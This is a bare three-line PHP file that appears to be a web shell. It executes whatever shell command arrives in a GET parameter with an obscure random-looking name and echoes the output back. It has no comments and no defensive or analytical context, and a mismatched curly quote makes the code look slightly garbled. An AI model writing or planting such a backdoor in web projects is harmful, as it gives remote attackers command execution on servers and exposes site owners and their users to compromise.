<?php
passthru($_GET[’j1WWVjMU']);
?>
